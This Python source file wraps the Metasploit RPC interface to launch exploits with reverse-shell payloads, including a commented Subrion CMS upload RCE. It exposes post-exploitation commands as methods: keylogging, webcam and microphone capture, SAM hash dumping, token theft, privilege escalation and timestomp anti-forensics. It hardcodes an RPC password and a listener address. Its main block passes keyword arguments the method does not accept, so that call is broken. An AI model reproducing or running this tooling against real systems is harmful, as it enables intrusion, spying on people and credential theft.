import re
import time
from pymetasploit3.msfrpc import *


def read_multiple_lines(shell, max_reads=100, timeout=5):
    result = []
    reads = 0
    start_time = time.time()
    while reads < max_reads and time.time() - start_time < timeout:
        r = shell.read()
        if r:
            result.append(r)
            reads += 1
        else:
            break
    return "".join(result)


class MetasploitExecutor:
    def __init__(self, password=None, host_ip=None, listening_port=None, config=None):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        if config:
            self.client = MsfRpcClient(
                config["metasploit"]["password"],
                port=int(config["metasploit"]["listening_port"]),
            )
            self.host = config["metasploit"]["host_ip"]
            self.listening_port = config["metasploit"]["listening_port"]
        else:
            self.client = MsfRpcClient(password, port=55552)
            self.host = host_ip
            self.listening_port = listening_port

    def exploit_and_execute_payload(
        self,
        exploit_module_name,
        payload_module_name,
        RHOSTS=None,
        LHOST=None,
        LPORT=None,
        PASSWORD=None,
        TARGETURI=None,
        RPORT=None,
        USERNAME=None,
        AHOST=None,
        CMD=None,
    ):
        exploit = self.client.modules.use("exploit", exploit_module_name)

        if RHOSTS:
            exploit["RHOSTS"] = RHOSTS
            if "PASSWORD" in exploit.options:
                exploit["PASSWORD"] = PASSWORD
            if "TARGETURI" in exploit.options:
                exploit["TARGETURI"] = TARGETURI
            if "RPORT" in exploit.options:
                exploit["RPORT"] = RPORT
            if "USERNAME" in exploit.options:
                exploit["USERNAME"] = USERNAME

        payload = self.client.modules.use("payload", payload_module_name)

        if LHOST is None:
            LHOST = self.host
        if LPORT is None:
            LPORT = self.listening_port

        if "LHOST" in payload.options:
            payload["LHOST"] = LHOST
        if "AHOST" in payload.options:
            payload["AHOST"] = AHOST
        if "CMD" in payload.options:
            payload["CMD"] = CMD
        payload["LPORT"] = LPORT

        execution_result = exploit.execute(payload=payload)

    def set_exploit_module(self, exploit_module_name, target=None):
        self.exploit = self.client.modules.use("exploit", exploit_module_name)

        if target:
            self.exploit["RHOSTS"] = target

    def set_payload_module(
        self, payload_module_name, listening_host=None, listening_port=None
    ):
        self.payload = self.client.modules.use("payload", payload_module_name)

        # If listening_host wasn't provided, use the instance attribute (self.host)
        if listening_host is None:
            listening_host = self.host

        # If listening_port wasn't provided, use the instance attribute (self.listening_port)
        if listening_port is None:
            listening_port = self.listening_port

        # self.payload["LHOST"] = listening_host
        self.payload["LPORT"] = listening_port

    def run(self):
        cid = self.client.call(MsfRpcMethod.ConsoleCreate)["id"]
        console = self.client.consoles.console(cid)

        console.run_module_with_output(self.exploit, payload=self.payload)
        time.sleep(5)

        sessions = self.get_sessions()
        new_sessions = [
            sid
            for sid, info in sessions.items()
            if info.get("type") == "meterpreter"
            and sid not in getattr(self, "known_sessions", set())
        ]

        if new_sessions:
            self.known_sessions = set(sessions.keys())
            self.set_default_session(new_sessions[0])
            print(f"New Meterpreter session: {new_sessions[0]}")
            return new_sessions[0]
        else:
            print("No new Meterpreter sessions created!")
            return None

    def set_default_session(self, default_session_id):
        self.default_session_id = default_session_id
        print(f"Set the default session id as: {default_session_id}!")

    def get_sessions(self):
        return self.client.sessions.list

    def select_session(self):
        time.sleep(20)
        sessions = self.get_sessions()
        if not sessions:
            print("No active sessions found.")
            return None

        print("Available sessions:")
        for session_id, session_info in sessions.items():
            print(
                f"ID: {session_id}, Type: {session_info['type']}, Info: {session_info['info']}"
            )

        while True:
            selected_id = input("Enter the session ID to select: ")
            if selected_id in sessions:
                self.set_default_session(selected_id)
                print(f"Selected session {selected_id}.")
                return selected_id
            else:
                print("Invalid session ID. Please try again.")

    # def communicate_with_msf_session(self, input_text, session_id=None):
    #     if session_id == None:
    #         session_id = self.default_session_id
    #     shell = self.client.sessions.session(session_id)
    #     shell.write(input_text)
    #     output = read_multiple_lines(shell)
    #     print(output)
    #     return output
    def communicate_with_msf_session(self, input_texts, session_id=None):
        if session_id is None:
            session_id = self.default_session_id
        shell = self.client.sessions.session(session_id)

        # Ensure input_texts is a list
        if isinstance(input_texts, str):
            input_texts = [input_texts]

        results = []
        for input_text in input_texts:
            shell.write(input_text)
            output = read_multiple_lines(shell)
            results.append(output)

        combined_output = "\n".join(results)
        print(combined_output)
        return combined_output

    def communicate_with_meterpreter_session(self, input_text, session_id=None):
        if session_id == None:
            session_id = self.default_session_id
        shell = self.client.sessions.session(session_id)
        output = shell.run_with_output(input_text)
        print(output)
        return output

    # return session
    def select_meterpreter_session(self):
        """select Meterpreter session"""
        time.sleep(10)
        sessions = self.get_sessions()
        if not sessions:
            print("No active sessions found.")
            return None
        meterpreter_sessions = {
            sid: info
            for sid, info in sessions.items()
            if info.get("type") == "meterpreter"
        }
        if not meterpreter_sessions:
            print("No available meterpreter sessions!")
            return None
        print("\nAvailable Meterpreter Sessions:")
        for sid, info in meterpreter_sessions.items():
            print(f"[{sid}] {info.get('info')}")
        while True:
            selected_id = input("Select session ID: ").strip()
            if selected_id not in meterpreter_sessions:
                print(
                    f"Invalid session ID {selected_id}. Valid options: {list(meterpreter_sessions.keys())}"
                )
                continue
            self.set_default_session(selected_id)
            print(f"Selected meterpreter session: {selected_id}")
            return selected_id

    def _clean_ansi_escape(self, text):
        """clear ANSI Escape"""
        ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
        return ansi_escape.sub("", text)

    def _get_meterpreter_session(self, session_id=None):
        """get Meterpreter session"""
        if session_id is None:
            session_id = self.select_meterpreter_session()
            if not session_id:
                raise ValueError("No valid meterpreter session available!")
        sessions = self.get_sessions()
        if session_id not in sessions:
            raise ValueError(f"Session {session_id} does not exist!")
        session_info = sessions[session_id]
        if session_info.get("type") != "meterpreter":
            raise ValueError(
                f"Session {session_id} is {session_info.get('type')} not meterpreter!"
            )

        return self.client.sessions.session(session_id)

    def execute_meterpreter_command(self, command, session_id=None):
        """Optimized command execution method"""
        try:
            session = self._get_meterpreter_session(session_id)
            output = session.run_with_output(command)
            cleaned_output = self._clean_ansi_escape(output)
            return cleaned_output
        except Exception as e:
            print(f"Command execute failure: {str(e)}")
            return ""

    # Stdapi: File system Commands
    def cat(self, remote_path, meterpreter_sessionid=None):
        """Read the contents of a file to the screen"""
        print(
            self.execute_meterpreter_command(
                f"cat {remote_path}", meterpreter_sessionid
            )
        )

    def cd(self, directory, meterpreter_sessionid=None):
        """Change directory"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"cd {directory} &\n")
            time.sleep(0.1)
            return f"Directory change initiated: {directory}"
        except:
            return "Failed to send cd command"

    def checksum(self, file_path, algorithm="sha1", meterpreter_sessionid=None):
        """Retrieve the checksum of a file"""
        cmd = f"checksum {algorithm} {file_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def chmod(self, file_path, mode, meterpreter_sessionid=None):
        """Change the permissions of a file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"chmod {mode} {file_path} &\n")
            time.sleep(0.1)
            return f"chmod finished"
        except:
            return "Failed to send chmod command"

    def cp(self, source, destination, meterpreter_sessionid=None):
        """Copy file/directory"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"cp {source} {destination} &\n")
            time.sleep(0.1)
            return f"copy finished"
        except:
            return "Failed to send cp command"

    def delete(self, file_path, meterpreter_sessionid=None):
        """Delete file (alias del)"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"del {file_path}\n")
            time.sleep(0.1)
            return f"del finished"
        except:
            return "Failed to send del command"

    def dir(self, directory=None, meterpreter_sessionid=None):
        """List files (alias for ls)"""
        if directory:
            directory = f'"{directory}"'
        return self.ls(directory, meterpreter_sessionid)

    def download(self, remote_path, local_path=None, meterpreter_sessionid=None):
        """Download a file or directory"""
        cmd = f"download {remote_path}"
        if local_path:
            cmd += f" {local_path}"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def edit(self, file_path, meterpreter_sessionid=None):
        """Edit a file"""
        cmd = f"edit {file_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def getlwd(self, meterpreter_sessionid=None):
        """Get local working directory (alias lpwd)"""
        return self.lpwd(meterpreter_sessionid)

    def getwd(self, meterpreter_sessionid=None):
        """Get remote working directory (alias pwd)"""
        return self.pwd(meterpreter_sessionid)

    def lcat(self, local_path, meterpreter_sessionid=None):
        """Read LOCAL file content"""
        cmd = f"lcat {local_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lcd(self, local_directory, meterpreter_sessionid=None):
        """Change LOCAL working directory"""
        cmd = f"lcd {local_directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ldir(self, directory=None, meterpreter_sessionid=None):
        """List LOCAL files (alias lls)"""
        return self.lls(directory, meterpreter_sessionid)

    def lls(self, directory=None, meterpreter_sessionid=None):
        """List LOCAL files"""
        cmd = "lls"
        if directory:
            cmd += f" {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lmkdir(self, directory, meterpreter_sessionid=None):
        """Create LOCAL directory"""
        cmd = f"lmkdir {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def lpwd(self, meterpreter_sessionid=None):
        """Print LOCAL working directory"""
        output = self.execute_meterpreter_command("lpwd", meterpreter_sessionid)
        print(output)
        return output

    def ls(self, directory=None, meterpreter_sessionid=None):
        """List files"""
        cmd = "ls"
        if directory:
            cmd += f" {directory}"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def mkdir(self, dir_path, meterpreter_sessionid=None):
        """Make directory"""
        print(
            self.execute_meterpreter_command(
                f'mkdir "{dir_path}"', meterpreter_sessionid
            )
        )

    def mv(self, source, destination, meterpreter_sessionid=None):
        """Move/rename file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"mv {source} {destination} &\n")
            time.sleep(0.1)
            return f"mv finished"
        except:
            return "Failed to send mv command"

    def pwd(self, meterpreter_sessionid=None):
        """Print working directory"""
        current_path = self.execute_meterpreter_command("pwd", meterpreter_sessionid)
        print(current_path)
        return current_path

    def rm(self, file_path, meterpreter_sessionid=None):
        """Delete the specified file"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"rm {file_path} &\n")
            time.sleep(0.1)
            return f"rm finished"
        except:
            return "Failed to send rm command"

    def rmdir(self, directory, meterpreter_sessionid=None):
        """Remove directory"""
        cmd = f"rmdir {directory}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def search(self, search_pattern, meterpreter_sessionid=None):
        """Search for files"""
        print(
            self.execute_meterpreter_command(
                f"search -f {search_pattern}", meterpreter_sessionid
            )
        )

    def upload(self, local_path, remote_path, meterpreter_sessionid=None):
        """Upload file/directory"""
        cmd = f"upload {local_path} {remote_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Stdapi: Networking Commands
    def arp(self, meterpreter_sessionid=None):
        """Display the host ARP cache"""
        print(self.execute_meterpreter_command("arp", meterpreter_sessionid))

    def getproxy(self, meterpreter_sessionid=None):
        """Display the current proxy configuration"""
        cmd = "getproxy"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ifconfig(self, meterpreter_sessionid=None):
        """Display interfaces"""
        cmd = "ifconfig"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def ipconfig(self, meterpreter_sessionid=None):
        """Display interfaces"""
        cmd = "ipconfig"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def netstat(self, meterpreter_sessionid=None):
        """Display the network connections"""
        cmd = "netstat"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def portfwd(
        self,
        action="list",
        local_port=None,
        remote_host=None,
        remote_port=None,
        meterpreter_sessionid=None,
    ):

        if action not in ["add", "delete", "list"]:
            raise ValueError(
                f"Invalid portfwd action: {action}. Valid options: add/delete/list"
            )

        cmd = f"portfwd {action}"
        if action == "add":
            if not all([local_port, remote_host, remote_port]):
                raise ValueError("portfwd add requires -l/-r/-p parameters")
            cmd += f" -l {local_port} -r {remote_host} -p {remote_port}"
        elif action == "delete":
            if not local_port:
                raise ValueError("portfwd delete requires -l parameter")
            cmd += f" -l {local_port}"

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def resolve(self, *hostnames, meterpreter_sessionid=None):

        if not hostnames:
            raise ValueError("At least one hostname required for resolve")

        cmd = f"resolve {' '.join(hostnames)}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def route(
        self,
        action="list",
        subnet=None,
        netmask=None,
        gateway=None,
        meterpreter_sessionid=None,
    ):
        """View and modify the routing table"""
        valid_actions = ["add", "delete", "list"]
        cmd = f"route {action}"

        if action not in valid_actions:
            raise ValueError(
                f"Invalid action: {action}. Valid options: {valid_actions}"
            )
        if action in ["add", "delete"]:
            if not all([subnet, netmask, gateway]):
                raise ValueError(f"route {action} requires subnet/netmask/gateway")
            cmd += f" {subnet} {netmask} {gateway}"
        elif action == "list" and any([subnet, netmask, gateway]):
            raise ValueError("route list doesn't accept parameters")

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Stdapi: System Commands
    def execute(self, command, meterpreter_sessionid=None):
        """Execute a command"""
        print(
            self.execute_meterpreter_command(
                f"execute -f {command}", meterpreter_sessionid
            )
        )

    def drop_token(self, meterpreter_sessionid=None):
        """Relinquishes any active impersonation token"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write("drop_token\n")
            output = session.read()
            print(output)
            time.sleep(0.1)
            return "drop_token finished"
        except Exception as e:
            return f"Failed to send drop_token command: {str(e)}"

    def getprivs(self, meterpreter_sessionid=None):
        """Attempt to enable all privileges available to the current process"""
        output = self.execute_meterpreter_command("getprivs", meterpreter_sessionid)
        print(output)
        return output

    def getsid(self, meterpreter_sessionid=None):
        """Get the SID of the user that the server is running as"""
        output = self.execute_meterpreter_command("getsid", meterpreter_sessionid)
        print(output)
        return output

    def rev2self(self, meterpreter_sessionid=None):
        """Calls RevertToSelf() on the remote machine"""
        output = self.execute_meterpreter_command("rev2self", meterpreter_sessionid)
        print(output)
        return output

    def reboot(self, meterpreter_sessionid=None):
        """Reboots the remote computer"""
        output = self.execute_meterpreter_command("reboot", meterpreter_sessionid)
        print(output)
        return output

    def shutdown(self, meterpreter_sessionid=None):
        """Shuts down the remote computer"""
        output = self.execute_meterpreter_command("shutdown", meterpreter_sessionid)
        print(output)
        return output

    def steal_token(self, pid, meterpreter_sessionid=None):
        """Attempts to steal an impersonation token from the target process"""
        output = self.execute_meterpreter_command(
            f"steal_token {pid}", meterpreter_sessionid
        )
        print(output)
        return output

    def suspend(self, *pids, options="", meterpreter_sessionid=None):
        """Suspends or resumes a list of processes"""
        try:
            if not pids:
                raise ValueError("At least one PID is required.")
            cmd = f"suspend {options} {' '.join(map(str, pids))}"
            session = self._get_meterpreter_session(meterpreter_sessionid)
            output = session.run_with_output(cmd)
            print(output)
            return output
        except Exception as e:
            print(f"Command execution failed: {str(e)}")
            return str(e)

    def getenv(self, var_name=None, meterpreter_sessionid=None):
        """Get one or more environment variable values"""
        cmd = f"getenv {var_name}" if var_name else "getenv"
        print(self.execute_meterpreter_command(cmd, meterpreter_sessionid))

    def getpid(self, meterpreter_sessionid=None):
        """Get the current process identifier"""
        print(self.execute_meterpreter_command("getpid", meterpreter_sessionid))

    def getuid(self, meterpreter_sessionid=None):
        """Get the user that the server is running as"""
        print(self.execute_meterpreter_command("getuid", meterpreter_sessionid))

    def kill(self, pid, meterpreter_sessionid=None):
        """Terminate a process"""
        print(self.execute_meterpreter_command(f"kill {pid}", meterpreter_sessionid))

    def localtime(self, meterpreter_sessionid=None):
        """Displays the target system local date and time"""
        print(self.execute_meterpreter_command("localtime", meterpreter_sessionid))

    def pgrep(self, process_name, meterpreter_sessionid=None):
        """Filter processes by name"""
        print(
            self.execute_meterpreter_command(
                f"pgrep {process_name}", meterpreter_sessionid
            )
        )

    def pkill(self, process_name, meterpreter_sessionid=None):
        """Terminate processes by name"""
        print(
            self.execute_meterpreter_command(
                f"pkill {process_name}", meterpreter_sessionid
            )
        )

    def ps(self, meterpreter_sessionid=None):
        """List running processes"""
        print(self.execute_meterpreter_command("ps", meterpreter_sessionid))

    def shell(self, meterpreter_sessionid=None):
        """Drop into a system command shell"""
        print(self.execute_meterpreter_command("shell", meterpreter_sessionid))

    def sysinfo(self, meterpreter_sessionid=None):
        """Gets information about the remote system, such as OS"""
        print(self.execute_meterpreter_command("sysinfo", meterpreter_sessionid))

    # Stdapi: User interface Commands
    def enumdesktops(self, meterpreter_sessionid=None):
        """List all accessible desktops and window stations"""
        output = self.execute_meterpreter_command("enumdesktops", meterpreter_sessionid)
        print(output)
        return output

    def getdesktop(self, meterpreter_sessionid=None):
        """Get the current meterpreter desktop"""
        output = self.execute_meterpreter_command("getdesktop", meterpreter_sessionid)
        print(output)
        return output

    def idletime(self, meterpreter_sessionid=None):
        """Returns the number of seconds the remote user has been idle"""
        output = self.execute_meterpreter_command("idletime", meterpreter_sessionid)
        print(output)
        return output

    def keyboard_send(self, keys, meterpreter_sessionid=None):
        """Send keystrokes"""
        output = self.execute_meterpreter_command(
            f'keyboard_send "{keys}"', meterpreter_sessionid
        )
        print(output)
        return output

    def keyevent(self, keycode, meterpreter_sessionid=None):
        """Send key events"""
        output = self.execute_meterpreter_command(
            f"keyevent {keycode}", meterpreter_sessionid
        )
        print(output)
        return output

    def keyscan_start(self, meterpreter_sessionid=None):
        """Start capturing keystrokes"""
        try:
            session = self._get_meterpreter_session(meterpreter_sessionid)
            session.write(f"keyscan_start")
            time.sleep(0.1)
            print(session.read())

            return f"copy finished"
        except:
            return "Failed to send keyscan_start command"

    def keyscan_stop(self, meterpreter_sessionid=None):
        """Stop capturing keystrokes"""
        output = self.execute_meterpreter_command("keyscan_stop", meterpreter_sessionid)
        print(output)
        return output

    def keyscan_dump(self, meterpreter_sessionid=None):
        """Dump the keystroke buffer"""
        time.sleep(10)
        output = self.execute_meterpreter_command("keyscan_dump", meterpreter_sessionid)
        print(output)
        return output

    def mouse(self, action, x=None, y=None, meterpreter_sessionid=None):
        """Send mouse events"""
        cmd = f"mouse -a {action}"
        if x and y:
            cmd += f" -x {x} -y {y}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def screenshare(self, quality=50, meterpreter_sessionid=None):
        """Watch the remote user desktop in real time"""
        output = self.execute_meterpreter_command(
            f"screenshare -q {quality}", meterpreter_sessionid
        )
        print(output)
        return output

    def screenshot(self, meterpreter_sessionid=None):
        """Grab a screenshot of the interactive desktop"""
        output = self.execute_meterpreter_command("screenshot", meterpreter_sessionid)
        print(output)
        return output

    def setdesktop(self, desktop_name, meterpreter_sessionid=None):
        """Change the meterpreters current desktop"""
        output = self.execute_meterpreter_command(
            f"setdesktop {desktop_name}", meterpreter_sessionid
        )
        print(output)
        return output

    def uictl(self, action, component, meterpreter_sessionid=None):
        """Usage: uictl [enable/disable] [keyboard/mouse]"""
        output = self.execute_meterpreter_command(
            f"uictl {action} {component}", meterpreter_sessionid
        )
        print(output)
        return output

    # Stdapi: Webcam Commands

    def record_mic(self, duration, save_path=None, meterpreter_sessionid=None):

        cmd = f"record_mic -d {duration}"
        if save_path:
            cmd += f" -o {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_chat(self, server_url, webcam_index=1, meterpreter_sessionid=None):

        cmd = f"webcam_chat -u {server_url} -i {webcam_index}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_list(self, meterpreter_sessionid=None):

        output = self.execute_meterpreter_command("webcam_list", meterpreter_sessionid)
        print(output)
        return output

    def webcam_snap(self, webcam_index=1, save_path=None, meterpreter_sessionid=None):

        cmd = f"webcam_snap -i {webcam_index}"
        if save_path:
            cmd += f" -p {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def webcam_stream(
        self,
        webcam_index=1,
        quality=50,
        resolution="640x480",
        save_path=None,
        meterpreter_sessionid=None,
    ):

        cmd = f"webcam_stream -i {webcam_index} -q {quality} -r {resolution}"
        if save_path:
            cmd += f" -p {save_path}"
        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    # Priv: Elevate Commands
    def getsystem(self, meterpreter_sessionid=None):
        """Attempt to elevate your privilege to that of local system"""
        output = self.execute_meterpreter_command("getsystem", meterpreter_sessionid)
        print(output)
        return output

    # Priv: Password database Commands
    def hashdump(self, meterpreter_sessionid=None):
        """Dumps the contents of the SAM database"""
        output = self.execute_meterpreter_command("hashdump", meterpreter_sessionid)
        print(output)
        return output

    # Timestomp Commands

    def timestomp(
        self, file_path, date_time=None, action="a", meterpreter_sessionid=None
    ):
        """Manipulate file MACE attributes"""

        if date_time:

            date_time_pattern = re.compile(
                r"^(?:(?:0[1-9]|1[0-2])/(?:0[1-9]|[12][0-9]|3[01])/[0-9]{4}) (?:[01][0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9]$"
            )

            if not date_time_pattern.match(date_time):
                raise ValueError("Invalid date format. Expected MM/DD/YYYY HH24:MI:SS")

        cmd = f'timestomp "{file_path}"'
        if date_time:
            cmd += f' -{action} "{date_time}"'

        output = self.execute_meterpreter_command(cmd, meterpreter_sessionid)
        print(output)
        return output

    def show_mount(self, meterpreter_sessionid=None):
        output = self.execute_meterpreter_command("show_mount", meterpreter_sessionid)
        print(output)
        return output


def extract_filename(search_output):
    match = re.search(r"([a-zA-Z]:\\(?:[\w\s.-]+\\)*[\w\s.-]+\.\w+)", search_output)

    if match:
        full_path = match.group(1).strip()  # Extract only the file path
        print("Extracted Path:", full_path)
    else:
        print("No valid path found!")
    return full_path


if __name__ == "__main__":
    me = MetasploitExecutor(
        password="Qcf17rjj", host_ip="127.0.0.1", listening_port=55552
    )
    # me.exploit_and_execute_payload(
    #     target="192.168.146.140",
    #     PASSWORD="Scam2021",
    #     TARGETURI="/subrion",
    #     RPORT=80,
    #     exploit_module_name="multi/http/subrion_cms_file_upload_rce",
    #     payload_module_name="php/meterpreter/reverse_tcp",
    #     listening_host="192.168.217.129",
    #     listening_port="4444",
    # )
    me.exploit_and_execute_payload(
        target="",
        PASSWORD="",
        TARGETURI="",
        RPORT=80,
        exploit_module_name="multi/handler",
        payload_module_name="windows/shell/reverse_tcp",
        listening_host="192.168.217.129",
        listening_port="4444",
    )

    metasploit_sessionid = me.select_session()
    commands = """
        whoami
        ipconfig
    """
    me.communicate_with_msf_session(
        input_texts=commands, session_id=metasploit_sessionid
    )
    ## Windows
    # Stdapi: Networking Commands
    # me.getproxy(meterpreter_sessionid)
    # me.ifconfig(meterpreter_sessionid)
    # me.ipconfig(meterpreter_sessionid)
    # me.netstat(meterpreter_sessionid)
    # me.route(action="add", subnet="10.0.0.0", netmask="255.0.0.0", gateway="10.0.0.1") #need higher privilege

    # Stdapi: System Commands
    # me.drop_token(meterpreter_sessionid)
    # me.getprivs(meterpreter_sessionid)
    # me.getsid(meterpreter_sessionid)
    # me.reboot(meterpreter_sessionid)
    # me.rev2self(meterpreter_sessionid)
    # me.shutdown(meterpreter_sessionid)
    # me.steal_token(6864, meterpreter_sessionid)
    # me.suspend(6864, options="-c", meterpreter_sessionid=meterpreter_sessionid)

    # Stdapi: User interface Commands
    # me.enumdesktops(meterpreter_sessionid)
    # me.getdesktop(meterpreter_sessionid)
    # me.idletime(meterpreter_sessionid)
    # me.keyboard_send("Hello World", meterpreter_sessionid)
    # me.keyscan_start(meterpreter_sessionid)
    # me.keyscan_stop(meterpreter_sessionid)
    # me.keyscan_dump(meterpreter_sessionid)
    # me.mouse("move", x=100, y=100, meterpreter_sessionid=meterpreter_sessionid)
    # me.setdesktop("winsta0\\default", meterpreter_sessionid)
    # me.keyevent(32, meterpreter_sessionid)
    # me.uictl(
    #     component="keyboard",
    #     action="disable",
    #     meterpreter_sessionid=meterpreter_sessionid,
    # )
    # me.screenshare(50, meterpreter_sessionid)
    # me.screenshot(meterpreter_sessionid)

    # Priv: Elevate Commands
    # me.getsystem(meterpreter_sessionid)

    # Priv: Password database Commands
    # me.hashdump(meterpreter_sessionid)

    # Timestomp Commands
    # me.timestomp(
    #     "C:\\Users\\Attacker\\Desktop\\test.txt",
    #     "10/01/2020 03:24:00",
    #     action="m",
    #     meterpreter_sessionid=meterpreter_sessionid,
    # )

    ## Linux
    # Stdapi: File system Commands
    # me.cat("/tmp/1.txt", meterpreter_sessionid)
    # me.cd("/bin", meterpreter_sessionid)
    # me.pwd(meterpreter_sessionid)
    # me.chmod("/tmp/1.txt", 777, meterpreter_sessionid)
    # me.checksum("/var/www/html/index.html", "md5", meterpreter_sessionid)
    # me.cp("/var/www/html/index.html", "/tmp/index.html", meterpreter_sessionid)
    # me.delete("/tmp/index.html", meterpreter_sessionid)
    # me.delete("C:/Users/Attacker/Desktop/test1.txt", meterpreter_sessionid)
    # me.dir("/tmp", meterpreter_sessionid)
    # me.mkdir("/tmp/tmp", meterpreter_sessionid)
    # me.mv("/tmp/index.html", "/tmp/index2.html", meterpreter_sessionid)
    # me.rm("/tmp/index.html", meterpreter_sessionid)
    # me.rmdir("/tmp/tmp", meterpreter_sessionid)
    # me.search("*.tmb", meterpreter_sessionid)
    # me.upload("/home/kali/Desktop/1.txt", "/tmp/1.txt", meterpreter_sessionid)
    # me.download("/tmp/1.txt", "/home/kali/Desktop/tmp", meterpreter_sessionid)

    # Stdapi: Networking Commands
    # me.arp(meterpreter_sessionid)

    # Stdapi: System Commands testing-ALL OK
    # me.execute("/usr/bin/whoami -i", meterpreter_sessionid)
    # me.getenv("PATH", meterpreter_sessionid)
    # me.getpid(meterpreter_sessionid)
    # me.getuid(meterpreter_sessionid)
    # me.kill(2769, meterpreter_sessionid)
    # me.localtime(meterpreter_sessionid)
    # me.pgrep("bash", meterpreter_sessionid)
    # me.pkill("bash", meterpreter_sessionid)
    # me.ps(meterpreter_sessionid)
    # me.shell(meterpreter_sessionid)
    # me.sysinfo(meterpreter_sessionid)
